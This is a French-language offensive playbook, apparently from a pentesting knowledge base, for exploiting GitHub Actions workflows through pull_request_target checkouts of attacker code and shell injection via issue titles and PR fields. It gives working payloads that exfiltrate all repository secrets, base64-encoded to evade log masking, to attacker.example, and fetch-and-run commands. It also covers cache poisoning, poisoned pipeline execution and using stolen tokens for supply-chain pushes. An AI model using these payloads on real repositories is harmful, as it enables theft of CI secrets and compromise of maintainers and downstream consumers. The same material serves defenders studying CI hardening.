---
title: "Injection de workflow Actions : exécuter du code attaquant dans un pipeline CI privilégié"
order: 2
description: "Transformer GitHub Actions en exécution de code via les déclencheurs pull_request_target et workflow_run qui récupèrent le code de la PR attaquante avec un GITHUB_TOKEN en lecture-écriture, et l'injection de script shell depuis des expressions de contexte non fiables, avec exfiltration de secrets et empoisonnement du cache."
keywords:
  - pull_request_target
  - workflow_run
  - injection de script
  - GITHUB_TOKEN
  - exécution de pipeline empoisonnée
---

# Injection de workflow Actions

GitHub Actions exécute le code défini dans `.github/workflows/*.yml` en réponse à des événements de dépôt. Deux faits de conception en font une cible d'exécution depuis l'extérieur : certains déclencheurs exécutent le workflow **depuis le dépôt de base avec un jeton privilégié tout en récupérant le code de l'attaquant**, et les fichiers de workflow **interpolent le texte d'événement non fiable directement dans le shell**. L'un comme l'autre transforme une pull request ou un ticket en exécution de code avec les secrets du dépôt à portée de main.

## Faire l'empreinte d'abord

Lisez les workflows avant de toucher à quoi que ce soit. Les marqueurs dangereux :

```bash
gh api /repos/ACME/service/contents/.github/workflows -q '.[].name'
for f in $(gh api /repos/ACME/service/contents/.github/workflows -q '.[].path'); do
  gh api "/repos/ACME/service/contents/$f" -q '.content' | base64 -d
done | grep -nE 'pull_request_target|workflow_run|github\.event\.(issue|pull_request|comment)|actions/checkout.*ref|self-hosted'
```

- `pull_request_target` ou `workflow_run` plus une récupération explicite de la tête de la PR signifie **classe A** (contexte privilégié exécutant votre code).
- `${{ github.event.* }}` atterrissant à l'intérieur d'un bloc `run:` signifie **classe B** (injection de script).
- `permissions:` absent, ou `contents: write`/`id-token: write`, augmente le gain.

## Classe A : pull_request_target exécutant du code attaquant

Une `pull_request` issue d'un fork s'exécute avec un `GITHUB_TOKEN` en **lecture seule** et sans secrets, par conception. `pull_request_target`, en revanche, s'exécute dans le contexte du dépôt **de base** : `GITHUB_TOKEN` en lecture-écriture, accès complet aux `secrets`, mais il récupère le code de base par défaut. La vulnérabilité est un workflow qui récupère explicitement la tête de la PR puis la build ou l'exécute :

```yaml
# Vulnerable workflow in the TARGET repo (.github/workflows/label.yml)
on:
  pull_request_target:          # runs with base-repo secrets + write token
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # checks out MY code
      - run: npm install && npm run build                   # runs MY package.json scripts
```

Vous ne contrôlez pas le workflow, seulement la PR. Ouvrez une PR depuis un fork dont le `package.json` (ou tout script que le pipeline invoque) porte la charge utile :

```json
{
  "scripts": {
    "build": "env | base64 | curl -s -d @- https://attacker.example/x"
  }
}
```

Lorsque l'automatisation des mainteneurs déclenche le workflow, votre `build` s'exécute avec l'environnement du dépôt de base, qui inclut un `GITHUB_TOKEN` capable d'écrire et les secrets injectés.

## Vider les secrets

À l'intérieur d'une exécution privilégiée, chaque secret est accessible via le contexte `secrets`. L'exfiltration fiable consiste à les sérialiser et à les expédier, enveloppés en base64 pour que les sauts de ligne survivent :

```yaml
      - name: collect
        run: |
          echo '${{ toJSON(secrets) }}' | base64 -w0 | curl -s -X POST --data-binary @- https://attacker.example/s
          echo "${{ secrets.GITHUB_TOKEN }}" > /tmp/t
```

`toJSON(secrets)` vide toute la carte des secrets en une seule expression. GitHub masque les chaînes de secrets connues dans les logs, ce qui est précisément la raison pour laquelle vous exfiltrez plutôt que d'imprimer : l'encodage base64 casse la correspondance littérale du masqueur, et les données quittent le runner intactes.

## Classe B : injection de script depuis des expressions de contexte

Lorsqu'un champ non fiable est interpolé dans une étape `run:`, GitHub substitue le texte brut **avant** que le shell n'analyse la ligne, de sorte que les métacaractères shell présents dans ce texte s'exécutent. Les points d'injection classiques sont les titres de tickets, les titres et corps de PR, les corps de commentaires et les noms de branches :

```yaml
# Vulnerable step
      - run: echo "New issue: ${{ github.event.issue.title }}"
```

Créez un ticket dont le titre est une substitution de commande et le runner l'exécute :

```
Title:  foo"; curl -s https://attacker.example/p.sh | bash; echo "
```

Après substitution, l'étape devient `echo "New issue: foo"; curl ... | bash; echo ""`, et votre script s'exécute avec le jeton et les secrets du workflow. La même charge utile fonctionne dans un corps de PR, un commentaire de revue ou un nom de branche fabriqué reflété dans une étape.

Une variante plus discrète prépare la charge utile via une variable d'environnement mais s'échappe quand même si la valeur atteint un shell sans guillemets ; le correctif que les mainteneurs omettent, c'est la mise entre guillemets, raison pour laquelle tout `${{ ... }}` sans guillemets dans `run:` est un candidat.

## Variantes et suite

- **Exécution de pipeline empoisonnée (PPE)** : lorsque vous pouvez pousser vers une branche en laquelle la CI a confiance, ou modifier le workflow lui-même dans une PR qu'un déclencheur moins restreint exécute, vous modifiez le pipeline directement plutôt que d'y faire passer du code en contrebande. Le PPE direct modifie le workflow dans le dépôt ; le PPE indirect empoisonne un fichier que le pipeline lit (un `Makefile`, un script de test, un fichier de verrouillage de dépendances).
- **Empoisonnement du cache et des artefacts** : un job `pull_request` à faible privilège peut écrire dans le cache Actions. Un workflow privilégié ultérieur qui restaure cette clé de cache exécute votre contenu déposé. De même, les artefacts téléversés par un job non fiable et consommés par un job de confiance transportent votre charge utile au-delà de la frontière de privilèges.
- **Suite** : le `GITHUB_TOKEN` que vous capturez peut pousser des commits et des tags, créer des releases, et (avec `id-token: write`) générer un jeton OIDC pour assumer un rôle cloud. Acheminez-le vers [abus des jetons et de GITHUB_TOKEN](token-and-github-token-abuse.md). Les secrets vidés de l'exécution (clés de déploiement, jetons de registre, clés cloud) alimentent le mouvement latéral et les pushs de supply-chain vers les consommateurs en aval.

## Notes d'exploitation

- Confirmez le déclencheur : une `pull_request` issue d'un fork est quasi inoffensive ; `pull_request_target` et `workflow_run` sont les privilégiés. Le `ref` de checkout vous indique si votre code s'exécute réellement.
- Encodez en base64 les secrets exfiltrés ; le masqueur de logs ne capture que les chaînes littérales connues.
- `toJSON(secrets)` est le vidage en un coup ; `toJSON(github)` et `env` révèlent le reste du contexte d'exécution, y compris le chemin du jeton.
- Sur GHES, les mêmes déclencheurs se comportent à l'identique ; les runners auto-hébergés (le défaut là-bas) font passer la classe A en RCE sur l'hôte, voir [prise de contrôle de runner auto-hébergé](self-hosted-runner-takeover.md).

## Outils

- **gato** (Praetorian) : énumère les workflows d'organisation/dépôt pour repérer les conditions injectables et de runner auto-hébergé, et peut pousser des workflows de PoC.
- **actionlint** : linter statique dont les résultats servent aussi de carte des expressions de contexte injectables.
- **nektos/act** : exécuter un workflow cible localement pour développer et tester une charge utile hors ligne.

## Références

- [GitHub : security hardening, untrusted input](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections)
- [Synacktiv : GitHub Actions exploitation (pull_request_target)](https://www.synacktiv.com/en/publications/github-actions-exploitation-untrusted-input.html)
- [Praetorian : gato and the Actions attack surface](https://github.com/praetorian-inc/gato)
- [GitHub Security Lab : keeping your GitHub Actions and workflows secure](https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/)
- [Adnan Khan : cache poisoning in GitHub Actions](https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/)
